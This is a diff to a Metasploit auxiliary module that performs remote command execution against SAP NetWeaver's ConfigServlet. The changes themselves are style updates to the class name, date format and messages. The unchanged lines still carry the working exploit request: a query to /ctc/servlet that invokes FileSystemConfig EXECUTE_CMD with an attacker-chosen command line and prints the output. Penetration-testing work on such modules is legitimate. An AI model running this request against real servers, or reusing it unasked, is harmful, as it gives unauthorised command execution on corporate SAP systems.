@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -28,7 +25,7 @@ class Metasploit4 < Msf::Auxiliary
           [ 'EDB', '24963' ],
           [ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf']
         ],
-      'DisclosureDate' => 'Nov 01 2012' # Based on the reference presentation
+      'DisclosureDate' => '2012-11-01' # Based on the reference presentation
     ))
 
     register_options(
@@ -36,7 +33,7 @@ class Metasploit4 < Msf::Auxiliary
         Opt::RPORT(50000),
         OptString.new('CMD', [ true, 'The command to execute', 'whoami']),
         OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/ctc/servlet'])
-      ], self.class)
+      ])
   end
 
   def run
@@ -51,7 +48,7 @@ class Metasploit4 < Msf::Auxiliary
           'query' => 'param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + Rex::Text::uri_encode(datastore['CMD'])
         })
       if !res or res.code != 200
-        print_error("#{rhost}:#{rport} - Exploit failed.")
+        print_error("#{rhost}:#{rport} - Exploit failed")
         return
       end
     rescue ::Rex::ConnectionError
@@ -64,7 +61,7 @@ class Metasploit4 < Msf::Auxiliary
       print_line("#{rhost}:#{rport} - Command: #{datastore['CMD']}\n")
       print_line("#{rhost}:#{rport} - Output: #{res.body}")
     else
-      print_error("#{rhost}:#{rport} - Exploit failed.")
+      print_error("#{rhost}:#{rport} - Exploit failed")
       vprint_error("#{rhost}:#{rport} - Output: #{res.body}")
     end
   end
